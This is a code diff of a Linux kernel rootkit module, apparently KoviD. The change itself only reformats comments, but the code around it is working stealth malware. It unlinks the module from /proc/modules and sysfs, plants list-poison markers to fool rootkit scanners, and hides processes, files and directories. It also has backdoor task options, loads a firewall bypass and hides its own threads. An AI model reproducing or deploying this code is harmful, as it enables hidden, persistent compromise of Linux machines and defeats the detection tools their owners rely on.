@@ -38,10 +38,9 @@
 #endif
 
 #ifndef PRCTIMEOUT
-/**
- * default timeout seconds
- * before /proc/<name> is removed
- */
+
+// default timeout seconds
+// before /proc/<name> is removed
 #define _PRCTIMEOUT 360
 #else
 #define _PRCTIMEOUT PRCTIMEOUT
@@ -78,11 +77,9 @@ static const struct __lkmmod_t lkmmod = {
 	.this_mod = THIS_MODULE,
 };
 
-/*
- * kernel structures so the compiler
- * can know about sizes and data types
- */
-/** kernel/params.c */
+// kernel structures so the compiler
+// can know about sizes and data types
+// kernel/params.c
 struct param_attribute {
 	struct module_attribute mattr;
 	const struct kernel_param *param;
@@ -106,12 +103,10 @@ struct module_sect_attrs {
 	struct module_sect_attr attrs[0];
 };
 
-/*
- * sysfs restoration helpers.
- * Mostly copycat from the kernel with
- * light modifications to handle only a subset
- * of sysfs files
- */
+// sysfs restoration helpers.
+// Mostly copycat from the kernel with
+// light modifications to handle only a subset
+// of sysfs files
 static ssize_t show_refcnt(struct module_attribute *mattr,
 			   struct module_kobject *mk, char *buffer)
 {
@@ -167,12 +162,10 @@ error_out:
 	return error;
 }
 
-/*
- * Remove the module entries
- * in /proc/modules and /sys/module/<MODNAME>
- * Also backup references needed for
- * _unhide_mod()
- */
+// Remove the module entries
+// in /proc/modules and /sys/module/<MODNAME>
+// Also backup references needed for
+// _unhide_mod()
 struct rmmod_controller {
 	struct kobject *parent;
 	struct module_sect_attrs *attrs;
@@ -192,70 +185,61 @@ static int _hide_mod(void)
 
 	if (NULL != mod_list)
 		return -EINVAL;
-	/*
-     *  sysfs looks more and less
-     *  like this, before removal:
-     *
-     *  /sys/module/<MODNAME>/
-     *  ├── coresize
-     *  ├── holders
-     *  ├── initsize
-     *  ├── initstate
-     *  ├── notes
-     *  ├── refcnt
-     *  ├── sections
-     *  │   ├── __bug_table
-     *  │   └── __mcount_loc
-     *  ├── srcversion
-     *  ├── taint
-     *  └── uevent
-     */
 
-	/** Backup and remove this module from /proc/modules */
+	// sysfs looks more and less
+	// like this, before removal:
+	//
+	// /sys/module/<MODNAME>/
+	// ├── coresize
+	// ├── holders
+	// ├── initsize
+	// ├── initstate
+	// ├── notes
+	// ├── refcnt
+	// ├── sections
+	// │   ├── __bug_table
+	// │   └── __mcount_loc
+	// ├── srcversion
+	// ├── taint
+	// └── uevent
+
+	// Backup and remove this module from /proc/modules
 	this_list = lkmmod.this_mod->list;
 	mod_list = this_list.prev;
 	spin_lock(&hiddenmod_spinlock);
 
-	/**
-     * We bypass original list_del()
-     */
+	// bypass original list_del()
 	kv_list_del(this_list.prev, this_list.next);
 
-	/*
-     * To deceive certain rootkit hunters scanning for
-     * markers set by list_del(), we perform a swap with
-     * LIST_POISON. This strategy should be effective,
-     * as long as you don't enable list debugging (lib/list_debug.c).
-     */
+	// To deceive certain rootkit hunters scanning for
+	// markers set by list_del(), we perform a swap with
+	// LIST_POISON. This strategy should be effective,
+	// as long as you don't enable list debugging (lib/list_debug.c).
 	this_list.next = (struct list_head *)LIST_POISON2;
 	this_list.prev = (struct list_head *)LIST_POISON1;
 
 	spin_unlock(&hiddenmod_spinlock);
 
-	/** Backup and remove this module from sysfs */
+	// Backup and remove this module from sysfs
 	rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
 	rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
 	kobject_del(lkmmod.this_mod->holders_dir->parent);
 
-	/**
-     * Again, mess with the known marker set by
-     * kobject_del()
-     */
+	// Again, mess with the known marker set by
+	// kobject_del()
 	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 
-	/* __module_address will return NULL for us
-     * as long as we are "loading"... */
+	// __module_address will return NULL for us
+	// as long as we are "loading"...
 	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 
 	return 0;
 }
 
-/*
- * This function is responsible for restoring module entries in both
- * /proc/modules and /sys/module/<module>/. After this function is
- * executed, the recommended action is to proceed with the rmmod
- * command to unload the module safely.
- */
+// This function is responsible for restoring module entries in both
+// /proc/modules and /sys/module/<module>/. After this function is
+// executed, the recommended action is to proceed with the rmmod
+// command to unload the module safely.
 static int _unhide_mod(void)
 {
 	int err;
@@ -264,25 +248,23 @@ static int _unhide_mod(void)
 	if (!mod_list)
 		return -EINVAL;
 
-	/*
-     * Sysfs is intrinsically linked to kernel objects. In this section,
-     * we reinstate only the essential sysfs entries required when
-     * performing rmmod.
-     *
-     * After the restoration process, the sysfs structure will
-     * appear as follows:
-     *
-     * /sys/module/<MODNAME>/
-     * ├── holders
-     * ├── refcnt
-     * └── sections
-     *   └── __mcount_loc
-     */
+	// Sysfs is intrinsically linked to kernel objects. In this section,
+	// we reinstate only the essential sysfs entries required when
+	// performing rmmod.
+	//
+	// After the restoration process, the sysfs structure will
+	// appear as follows:
+	//
+	// /sys/module/<MODNAME>/
+	// ├── holders
+	// ├── refcnt
+	// └── sections
+	//   └── __mcount_loc
 
-	/** Sets back the active state */
+	// Sets back the active state
 	lkmmod.this_mod->state = MODULE_STATE_LIVE;
 
-	/** MODNAME is the parent kernel object */
+	// MODNAME is the parent kernel object
 	err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent,
 			  "%s", MODNAME);
 	if (err)
@@ -295,18 +277,18 @@ static int _unhide_mod(void)
 
 	lkmmod.this_mod->holders_dir = kobj;
 
-	/** Create sysfs representation of kernel objects */
+	// Create sysfs representation of kernel objects
 	err = sysfs_create_group(&(lkmmod.this_mod->mkobj.kobj),
 				 &rmmod_ctrl.attrs->grp);
 	if (err)
 		goto out_put_kobj;
 
-	/** Setup attributes */
+	// Setup attributes
 	err = module_add_modinfo_attrs(lkmmod.this_mod);
 	if (err)
 		goto out_attrs;
 
-	/** Restore /proc/module entry */
+	// Restore /proc/module entry
 	spin_lock(&hiddenmod_spinlock);
 
 	list_add(&(lkmmod.this_mod->list), mod_list);
@@ -314,7 +296,7 @@ static int _unhide_mod(void)
 	goto out_put_kobj;
 
 out_attrs:
-	/** Rewind attributes */
+	// Rewind attributes
 	if (lkmmod.this_mod->mkobj.mp) {
 		sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj),
 				   &lkmmod.this_mod->mkobj.mp->grp);
@@ -325,7 +307,7 @@ out_attrs:
 	}
 
 out_put_kobj:
-	/** Decrement refcount */
+	// Decrement refcount
 	kobject_put(&(lkmmod.this_mod->mkobj.kobj));
 	mod_list = NULL;
 
@@ -389,7 +371,7 @@ static inline void _msguser_toggle(void)
 	_set_msguser(&msguser_enable, MSG_INT);
 }
 
-/** XXX: fix/improve this API */
+// XXX: fix/improve this API
 static struct msguser_t *get_msguser(bool *ready)
 {
 	spin_lock(&msguser_spin);
@@ -453,12 +435,11 @@ cleanup:
 leave:
 	return rv;
 }
-/*
- * This function removes the proc interface after a
- * certain amount of time has passed.
- * It can be re-activated using a
- * kill signal.
- */
+
+// This function removes the proc interface after a
+// certain amount of time has passed.
+// It can be re-activated using a
+// kill signal.
 static int proc_timeout(unsigned int t)
 {
 	static unsigned int cnt = PRC_TIMEOUT;
@@ -479,18 +460,18 @@ static int proc_timeout(unsigned int t)
 enum {
 	Opt_unknown = -1,
 
-	/** task (PID) operations */
+	// task (PID) operations
 	Opt_hide_task_backdoor,
 	Opt_list_hidden_tasks,
 	Opt_list_all_tasks,
 	Opt_list_back_door,
 	Opt_rename_hidden_task,
 
-	/** this module stealth */
+	// this module stealth
 	Opt_hide_module,
 	Opt_unhide_module,
 
-	/** file stealth operations */
+	// file stealth operations
 	Opt_hide_file,
 	Opt_hide_directory,
 	Opt_hide_file_anywhere,
@@ -498,7 +479,7 @@ enum {
 	Opt_unhide_file,
 	Opt_unhide_directory,
 
-	/** misc */
+	// misc
 	Opt_journalclt,
 	Opt_fetch_base_address,
 	Opt_signal_task_stop,
@@ -509,7 +490,7 @@ enum {
 	Opt_output_enable,
 
 #ifdef DEBUG_RING_BUFFER
-	/**debug */
+	// debug
 	Opt_get_bdkey,
 	Opt_get_unhidekey,
 #endif
@@ -601,7 +582,7 @@ static int _hide_path(const char *s)
 	int rc = -EINVAL;
 
 	if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
-		/** It is filename, no problem because we have path.dentry */
+		// It is filename, no problem because we have path.dentry
 		const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
 		bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
 
@@ -616,7 +597,7 @@ static int _hide_path(const char *s)
 		path_put(&path);
 		kv_mem_free(&f);
 	} else if (*s != '.' && *s != '/') {
-		/** add with unknown inode number */
+		// add with unknown inode number
 		rc = fs_add_name_rw(s, /*ino=*/0);
 	}
 
@@ -635,7 +616,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 	if (copy_from_user(param, user, CMD_MAXLEN))
 		return -EFAULT;
 
-	/** exclude trailing stuff we don't care */
+	// exclude trailing stuff we don't care
 	param[strcspn(param, "\r\n")] = 0;
 
 	pid = (pid_t)simple_strtol((const char *)param, NULL, 10);
@@ -697,9 +678,8 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			rc = fs_del_name(args[0].from);
 			_set_msguser_retcode(&rc, MSG_INT);
 			break;
-			/** Currently, directories must
-			* be added individually: use hide-directory
-			*/
+			// Currently, directories must
+			// be added individually: use hide-directory
 		case Opt_hide_file_anywhere:
 			rc = fs_add_name_rw(args[0].from, 0);
 			_set_msguser_retcode(&rc, MSG_INT);
@@ -770,16 +750,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		}
 	}
 
-	/** Interactions with UI will reset
-     * /proc interface timeout */
+	// Interactions with UI will reset
+	///proc interface timeout */
 	proc_timeout(PRC_RESET);
 
 	return size;
 }
 
-/**
- * proc file callbacks and defs
- */
+// proc file callbacks and defs
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 6, 0)
 static const struct file_operations proc_file_fops = {
 	.owner = THIS_MODULE,
@@ -811,7 +789,7 @@ int kv_add_proc_interface(void)
 	kuid_t kuid;
 	kgid_t kgid;
 #endif
-	/** is proc loaded? */
+	// is proc loaded?
 	if (rrProcFileEntry)
 		return 0;
 
@@ -831,7 +809,7 @@ try_reload:
 		}
 	}
 
-	/* set proc file maximum size & user as root */
+	// set proc file maximum size & user as root
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0)
 	rrProcFileEntry->size = PAGE_SIZE;
 	rrProcFileEntry->uid = 0;
@@ -858,11 +836,9 @@ leave:
 	return 1;
 }
 
-/**
- * Can be called from __exit
- * and outside of proc watchdog
- * context
- */
+// Can be called from __exit
+// and outside of proc watchdog
+// context
 static void _proc_rm_wrapper(void)
 {
 	mutex_lock(&prc_mtx);
@@ -924,8 +900,8 @@ static int _proc_watchdog(void *unused)
 
 static void _unroll_init(void)
 {
-	/** give time for any temporary thread
-	 * to finish */
+	// give time for any temporary thread
+	//to finish
 	ssleep(5);
 
 	if (tsk_prc && !IS_ERR(tsk_prc)) {
@@ -946,13 +922,11 @@ static int __init kv_init(void)
 	const char **name;
 	struct kernel_syscalls *kaddr = NULL;
 
-	/*
-     * Hide these names from write() fs output
-     */
+	// Hide these names from write() fs output
 	static const char *hide_names[] = { MODNAME, UUIDGEN ".ko",
 					    UUIDGEN ".sh", PROCNAME, NULL };
 
-	/** show current version for when running in debug mode */
+	// show current version for when running in debug mode
 	prinfo("version %s\n", KOVID_VERSION);
 
 	if (strlen(PROCNAME) == 0) {
@@ -988,7 +962,7 @@ static int __init kv_init(void)
 	if (!tsk_prc)
 		goto background_error;
 
-	/** Init crypto engine */
+	// Init crypto engine
 	if (kv_crypto_engine_init() < 0) {
 		prerr("Failed to initialise crypto engine\n");
 		goto crypto_error;
@@ -1012,11 +986,11 @@ static int __init kv_init(void)
 		prwarn("Error loading fw_bypass\n");
 	}
 
-	/** hide kthreads */
+	// hide kthreads
 	kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
 	kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
 
-	/** hide magic filenames, directories and processes */
+	// hide magic filenames, directories and processes
 	for (name = hide_names; *name != NULL; ++name) {
 		fs_add_name_ro(*name, 0);
 	}
